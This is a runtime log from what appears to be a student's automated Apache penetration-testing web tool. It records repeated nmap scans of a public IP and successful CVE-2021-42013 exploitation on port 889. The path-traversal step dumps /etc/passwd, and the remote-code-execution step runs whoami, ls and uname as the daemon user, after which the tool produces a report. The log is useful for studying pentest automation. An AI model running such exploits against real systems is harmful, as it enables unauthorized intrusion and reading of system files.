+2024-07-07 18:24:34,047 INFO 127.0.0.1 - - [07/Jul/2024 18:24:34] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 18:24:34,077 INFO 127.0.0.1 - - [07/Jul/2024 18:24:34] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 18:24:34,109 INFO 127.0.0.1 - - [07/Jul/2024 18:24:34] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:24:37,430 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 18:27:25,673 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 18:27:25,796 INFO  * Restarting with stat
+2024-07-07 18:27:27,861 WARNING  * Debugger is active!
+2024-07-07 18:27:27,861 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:27:27,910 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 18:27:39,695 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 18:27:39,808 INFO  * Restarting with stat
+2024-07-07 18:27:41,588 WARNING  * Debugger is active!
+2024-07-07 18:27:41,593 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:27:47,299 INFO 127.0.0.1 - - [07/Jul/2024 18:27:47] "GET / HTTP/1.1" 200 -
+2024-07-07 18:27:47,625 INFO 127.0.0.1 - - [07/Jul/2024 18:27:47] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:27:50,302 INFO 127.0.0.1 - - [07/Jul/2024 18:27:50] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 18:27:50,335 INFO 127.0.0.1 - - [07/Jul/2024 18:27:50] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 18:27:50,374 INFO 127.0.0.1 - - [07/Jul/2024 18:27:50] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:27:53,611 INFO Running Apache exploit on 152.42.212.132: with vulnerability pt
+2024-07-07 18:28:10,375 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 18:28:10,574 INFO  * Restarting with stat
+2024-07-07 18:28:55,505 INFO [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2024-07-07 18:28:55,505 INFO [33mPress CTRL+C to quit[0m
+2024-07-07 18:28:55,508 INFO  * Restarting with stat
+2024-07-07 18:28:56,814 WARNING  * Debugger is active!
+2024-07-07 18:28:56,819 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:29:01,023 INFO 127.0.0.1 - - [07/Jul/2024 18:29:01] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 18:29:01,210 INFO 127.0.0.1 - - [07/Jul/2024 18:29:01] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:29:05,397 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 18:37:57,940 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 18:32 SE Asia Standard Time
+889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+| http-methods: 
+|_http-server-header: Apache/2.4.50 (Unix)
+|_http-title: Site doesn't have a title (text/html).
+3790/tcp  open     http            nginx
+|_http-title: Did not follow redirect to https://152.42.212.132:3790/
+|     HTTP/1.1 302 Found
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|_  http/1.1
+|     HTTP/1.0 401 Unauthorized
+|     HTTP/1.0 401 Unauthorized
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|_    {"error":{"root_cause":[{"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"}],"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"},"status":400}
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     HTTP/1.0 200 OK
+|     {"host":"751247e67e9c","version":"8.13.4","http_address":"0.0.0.0:9600","id":"76e96a99-e805-4b63-97aa-b1561d4654a2","name":"logstash","ephemeral_id":"3a890be7-70bc-4622-84b9-4c22678de0ef","status":"green","snapshot":false,"pipeline":{"workers":4,"batch_size":125,"batch_delay":50},"build_date":"2024-05-06T13:04:36+00:00","build_sha":"80e67bc73d1dede7d683c72df122fc6be5d47d1b","build_snapshot":false}
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|_    /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/thread_pool.rb:155:in `block in spawn_thread'HTTP/1.1 400 Bad Request
+4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF:dows%r(GetRequest,2B3,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/login
+SF:\x20close\r\n\r\n")%r(HTTPOptions,308,"HTTP/1\.1\x20404\x20Not\x20Found
+SF:r(RTSPRequest,308,"HTTP/1\.1\x20404\x20Not\x20Found\r\nX-Content-Type-O
+SF:dows%r(GetRequest,29C,"HTTP/1\.0\x20401\x20Unauthorized\r\nWWW-Authenti
+SF:\]}},\"status\":401}")%r(HTTPOptions,89,"HTTP/1\.0\x20200\x20OK\r\nAllo
+SF:_argument_exception\",\"reason\":\"Unexpected\x20http\x20protocol\x20ve
+SF:on\":\"Unexpected\x20http\x20protocol\x20version:\x20RTSP/1\.0\"},\"sta
+SF:tus\":400}")%r(FourOhFourRequest,2E2,"HTTP/1\.0\x20401\x20Unauthorized\
+SF:(GenericLines,42A,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x20989\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\x20
+SF:an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::Http
+SF:ParserError\)\norg/jruby/puma/Http11\.java:200:in\x20`execute'\n/usr/sh
+SF:va/lib/puma/")%r(GetRequest,1F9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type
+SF:\",\"http_address\":\"0\.0\.0\.0:9600\",\"id\":\"76e96a99-e805-4b63-97a
+SF:83c72df122fc6be5d47d1b\",\"build_snapshot\":false}")%r(HTTPOptions,B9,"
+SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nX-Cascade:\x20pass\r\nContent-Type:
+SF:\":\"Not\x20Found\"}}")%r(RTSPRequest,337,"HTTP/1\.0\x20400\x20Bad\x20R
+SF::\x20Invalid\x20HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20
+SF:20Puma\?\x20\(Puma::HttpParserError\)\norg/jruby/puma/Http11\.java:200:
+SF:ib/puma/thread_pool\.rb:155:in\x20`block\x20in\x20spawn_thread'HTTP/1\.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+2024-07-07 18:37:57,943 INFO Found Apache ports: ['889', '3790']
+2024-07-07 18:37:57,943 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 18:37:57,969 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 18:37:58,076 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 18:37:58,200 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 18:37:58,311 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 18:38:20,714 INFO Checking vulnerabilities on http://152.42.212.132:3790
+2024-07-07 18:38:20,716 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 18:38:20,846 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 18:38:21,106 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 18:38:21,210 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 18:38:43,595 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 18:38:43,673 INFO Header added successfully.
+2024-07-07 18:38:43,685 INFO Cover page created successfully.
+2024-07-07 18:38:43,774 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 18:38:43,775 INFO Process completed in 578.3835246562958 seconds.
+2024-07-07 18:38:43,789 INFO 127.0.0.1 - - [07/Jul/2024 18:38:43] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 18:38:43,898 INFO 127.0.0.1 - - [07/Jul/2024 18:38:43] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:39:48,974 INFO 127.0.0.1 - - [07/Jul/2024 18:39:48] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-07 18:40:15,318 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\generate_report_apache.py', reloading
+2024-07-07 18:40:15,631 INFO  * Restarting with stat
+2024-07-07 18:40:17,478 WARNING  * Debugger is active!
+2024-07-07 18:40:17,489 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:40:42,167 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 18:40:42,294 INFO  * Restarting with stat
+2024-07-07 18:40:44,067 WARNING  * Debugger is active!
+2024-07-07 18:40:44,074 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:41:10,393 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 18:41:10,614 INFO  * Restarting with stat
+2024-07-07 18:41:12,588 WARNING  * Debugger is active!
+2024-07-07 18:41:12,594 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:41:14,198 INFO 127.0.0.1 - - [07/Jul/2024 18:41:14] "GET / HTTP/1.1" 200 -
+2024-07-07 18:41:14,354 INFO 127.0.0.1 - - [07/Jul/2024 18:41:14] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:41:16,267 INFO 127.0.0.1 - - [07/Jul/2024 18:41:16] "GET / HTTP/1.1" 200 -
+2024-07-07 18:41:16,310 INFO 127.0.0.1 - - [07/Jul/2024 18:41:16] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:41:19,093 INFO 127.0.0.1 - - [07/Jul/2024 18:41:19] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 18:41:19,131 INFO 127.0.0.1 - - [07/Jul/2024 18:41:19] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 18:41:19,165 INFO 127.0.0.1 - - [07/Jul/2024 18:41:19] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:41:22,417 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 18:50:45,769 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 18:44 SE Asia Standard Time
+889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+|_http-server-header: Apache/2.4.50 (Unix)
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+3790/tcp  open     http            nginx
+|_http-title: Did not follow redirect to https://152.42.212.132:3790/
+|     HTTP/1.1 302 Found
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|_  http/1.1
+|     HTTP/1.0 401 Unauthorized
+|     HTTP/1.0 401 Unauthorized
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|_    {"error":{"root_cause":[{"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"}],"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"},"status":400}
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     HTTP/1.0 200 OK
+|     {"host":"751247e67e9c","version":"8.13.4","http_address":"0.0.0.0:9600","id":"76e96a99-e805-4b63-97aa-b1561d4654a2","name":"logstash","ephemeral_id":"3a890be7-70bc-4622-84b9-4c22678de0ef","status":"green","snapshot":false,"pipeline":{"workers":4,"batch_size":125,"batch_delay":50},"build_date":"2024-05-06T13:04:36+00:00","build_sha":"80e67bc73d1dede7d683c72df122fc6be5d47d1b","build_snapshot":false}
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF:dows%r(GetRequest,2B3,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/login
+SF:\x20close\r\n\r\n")%r(HTTPOptions,308,"HTTP/1\.1\x20404\x20Not\x20Found
+SF:r(RTSPRequest,308,"HTTP/1\.1\x20404\x20Not\x20Found\r\nX-Content-Type-O
+SF:dows%r(GetRequest,29C,"HTTP/1\.0\x20401\x20Unauthorized\r\nWWW-Authenti
+SF:\]}},\"status\":401}")%r(HTTPOptions,89,"HTTP/1\.0\x20200\x20OK\r\nAllo
+SF:_argument_exception\",\"reason\":\"Unexpected\x20http\x20protocol\x20ve
+SF:on\":\"Unexpected\x20http\x20protocol\x20version:\x20RTSP/1\.0\"},\"sta
+SF:tus\":400}")%r(FourOhFourRequest,2E2,"HTTP/1\.0\x20401\x20Unauthorized\
+SF:(GenericLines,42A,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x20989\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\x20
+SF:an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::Http
+SF:ParserError\)\norg/jruby/puma/Http11\.java:200:in\x20`execute'\n/usr/sh
+SF:va/lib/puma/")%r(GetRequest,1F9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type
+SF:\",\"http_address\":\"0\.0\.0\.0:9600\",\"id\":\"76e96a99-e805-4b63-97a
+SF:83c72df122fc6be5d47d1b\",\"build_snapshot\":false}")%r(HTTPOptions,B9,"
+SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nX-Cascade:\x20pass\r\nContent-Type:
+SF:\":\"Not\x20Found\"}}")%r(RTSPRequest,42A,"HTTP/1\.0\x20400\x20Bad\x20R
+SF::\x20Invalid\x20HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20
+SF:20Puma\?\x20\(Puma::HttpParserError\)\norg/jruby/puma/Http11\.java:200:
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+2024-07-07 18:50:45,770 INFO Found Apache ports: ['889', '3790']
+2024-07-07 18:50:45,770 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 18:50:45,775 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 18:50:45,845 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 18:50:45,951 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 18:50:46,040 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 18:51:08,555 INFO Checking vulnerabilities on http://152.42.212.132:3790
+2024-07-07 18:51:08,557 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 18:51:08,637 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 18:51:08,637 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 18:51:08,719 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 18:51:08,727 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 18:51:08,835 INFO Header added successfully.
+2024-07-07 18:51:08,858 INFO Cover page created successfully.
+2024-07-07 18:51:09,005 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 18:51:09,005 INFO Process completed in 586.588036775589 seconds.
+2024-07-07 18:51:09,012 INFO 127.0.0.1 - - [07/Jul/2024 18:51:09] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 18:51:09,026 INFO 127.0.0.1 - - [07/Jul/2024 18:51:09] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:53:15,162 INFO 127.0.0.1 - - [07/Jul/2024 18:53:15] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-07 18:59:04,948 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 18:59:05,246 INFO  * Restarting with stat
+2024-07-07 18:59:06,872 WARNING  * Debugger is active!
+2024-07-07 18:59:06,879 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:59:39,600 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 18:59:39,841 INFO  * Restarting with stat
+2024-07-07 18:59:41,925 WARNING  * Debugger is active!
+2024-07-07 18:59:41,925 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:59:42,296 INFO 127.0.0.1 - - [07/Jul/2024 18:59:42] "GET / HTTP/1.1" 200 -
+2024-07-07 18:59:42,435 INFO 127.0.0.1 - - [07/Jul/2024 18:59:42] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 19:06:20,541 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 19:06:20,642 INFO  * Restarting with stat
+2024-07-07 19:06:22,015 WARNING  * Debugger is active!
+2024-07-07 19:06:22,021 INFO  * Debugger PIN: 860-226-893
+2024-07-07 19:06:25,984 INFO 127.0.0.1 - - [07/Jul/2024 19:06:25] "GET / HTTP/1.1" 200 -
+2024-07-07 19:06:26,194 INFO 127.0.0.1 - - [07/Jul/2024 19:06:26] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 19:06:29,454 INFO 127.0.0.1 - - [07/Jul/2024 19:06:29] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 19:06:29,481 INFO 127.0.0.1 - - [07/Jul/2024 19:06:29] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 19:06:29,515 INFO 127.0.0.1 - - [07/Jul/2024 19:06:29] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 19:06:35,288 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 19:14:31,337 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 19:07 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up (0.050s latency).
+Not shown: 65521 closed tcp ports (reset)
+PORT      STATE    SERVICE         VERSION
+22/tcp    open     ssh             OpenSSH 9.6p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 82:95:15:88:17:2c:b4:c9:b0:b7:bd:3f:03:ff:6f:c5 (ECDSA)
+|_  256 a9:b8:d6:8e:29:ca:55:fe:4c:9c:f1:ed:23:33:23:47 (ED25519)
+80/tcp    open     http?
+|_http-title: Welcome to nginx!
+889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.50 (Unix)
+3790/tcp  open     http            nginx
+|_http-title: Did not follow redirect to https://152.42.212.132:3790/
+|     HTTP/1.1 302 Found
+|     location: /login?next=%2F
+|     x-content-type-options: nosniff
+|     referrer-policy: strict-origin-when-cross-origin
+|     permissions-policy: camera=(), display-capture=(), fullscreen=(self), geolocation=(), microphone=(), web-share=()
+|     cross-origin-opener-policy: same-origin
+|     content-security-policy: script-src 'report-sample' 'self'; worker-src 'report-sample' 'self' blob:; style-src 'report-sample' 'self' 'unsafe-inline'
+|     kbn-name: kibana.backmie.online
+|     kbn-license-sig: 22b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88c86d5f5fe891
+|     cache-control: private, no-cache, no-store, must-revalidate
+|     content-length: 0
+|     Date: Sun, 07 Jul 2024 12:11:09 GMT
+|     Connection: close
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|     X-Content-Type-Options: nosniff
+|     Referrer-Policy: strict-origin-when-cross-origin
+|     Permissions-Policy: camera=(), display-capture=(), fullscreen=(self), geolocation=(), microphone=(), web-share=()
+|     Cross-Origin-Opener-Policy: same-origin
+|     Content-Security-Policy: script-src 'report-sample' 'self'; worker-src 'report-sample' 'self' blob:; style-src 'report-sample' 'self' 'unsafe-inline'
+|     kbn-name: kibana.backmie.online
+|     kbn-license-sig: 22b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88c86d5f5fe891
+|     content-type: application/json; charset=utf-8
+|     cache-control: private, no-cache, no-store, must-revalidate
+|     content-length: 60
+|     Date: Sun, 07 Jul 2024 12:11:09 GMT
+|     Connection: close
+|_    {"statusCode":404,"error":"Not Found","message":"Not Found"}
+|_  http/1.1
+|     HTTP/1.0 401 Unauthorized
+|     WWW-Authenticate: Basic realm="security" charset="UTF-8"
+|     WWW-Authenticate: Bearer realm="security"
+|     WWW-Authenticate: ApiKey
+|     content-type: application/json
+|     content-length: 529
+|     {"error":{"root_cause":[{"type":"security_exception","reason":"missing authentication credentials for REST request [/nice%20ports%2C/Tri%6Eity.txt%2ebak]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}}],"type":"security_exception","reason":"missing authentication credentials for REST request [/nice%20ports%2C/Tri%6Eity.txt%2ebak]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}},"status":401}
+|   GetRequest: 
+|     HTTP/1.0 401 Unauthorized
+|     WWW-Authenticate: Basic realm="security" charset="UTF-8"
+|     WWW-Authenticate: Bearer realm="security"
+|     WWW-Authenticate: ApiKey
+|     content-type: application/json
+|     content-length: 459
+|     {"error":{"root_cause":[{"type":"security_exception","reason":"missing authentication credentials for REST request [/]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}}],"type":"security_exception","reason":"missing authentication credentials for REST request [/]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}},"status":401}
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: GET,DELETE,HEAD
+|     X-elastic-product: Elasticsearch
+|     content-type: text/plain; charset=UTF-8
+|     content-length: 0
+|   RTSPRequest: 
+|     RTSP/1.0 400 Bad Request
+|     X-elastic-product: Elasticsearch
+|     content-type: application/json
+|     content-length: 221
+|_    {"error":{"root_cause":[{"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"}],"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"},"status":400}
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 989
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/client.rb:268:in `try_to_finish'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:298:in `reactor_wakeup'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:248:in `block in run'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/reactor.rb:119:in `wakeup!'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/reactor.rb:76:in `block in select_loop'
+|     org/nio4r/Selector.java:218:in `select'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Content-Length: 400
+|     {"host":"751247e67e9c","version":"8.13.4","http_address":"0.0.0.0:9600","id":"76e96a99-e805-4b63-97aa-b1561d4654a2","name":"logstash","ephemeral_id":"3a890be7-70bc-4622-84b9-4c22678de0ef","status":"green","snapshot":false,"pipeline":{"workers":4,"batch_size":125,"batch_delay":50},"build_date":"2024-05-06T13:04:36+00:00","build_sha":"80e67bc73d1dede7d683c72df122fc6be5d47d1b","build_snapshot":false}
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     X-Cascade: pass
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Content-Length: 57
+|     {"path":"/","status":404,"error":{"message":"Not Found"}}
+|   RTSPRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 746
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/client.rb:268:in `try_to_finish'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/client.rb:287:in `eagerly_finish'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:449:in `process_client'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:245:in `block in run'
+|_    /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/thread_pool.rb:155:in `block in spawn_thread'HTTP/1.1 400 Bad Request
+4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port53-TCP:V=7.94%I=7%D=7/7%Time=668A85D1%P=i686-pc-windows-windows%r(D
+SF:NSVersionBindReqTCP,E,"\0\x0c\0\x06\x81\x84\0\0\0\0\0\0\0\0");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5601-TCP:V=7.94%T=SSL%I=7%D=7/7%Time=668A85DD%P=i686-pc-windows-win
